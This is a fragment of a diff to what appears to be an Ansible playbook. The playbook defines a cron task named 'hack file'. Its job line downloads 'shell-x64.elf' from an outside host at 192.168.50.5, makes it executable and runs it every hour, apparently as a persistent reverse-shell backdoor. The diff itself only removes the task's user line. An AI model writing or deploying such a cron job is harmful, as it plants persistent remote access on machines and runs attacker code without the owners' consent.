@@ -26,6 +26,6 @@
   cron:
    name: "hack file"
    minute: "3"
-   user: server
    job: "wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf && chmod +x /home/server/shell-x64.elf && /home/server/shell-x64.elf"
+
 ...
